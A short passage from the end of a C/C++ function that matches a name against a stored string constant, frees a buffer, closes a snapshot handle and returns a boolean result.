									if (StrStr(name, Strs::trump)) ret = true;
								}
							}
							Mem::Free(fileBuf);
							if (ret) goto _end;
						}
					}
				}
			}
		}
	}
_end:
	CloseHandle(hSnapshot);
	return ret;
}
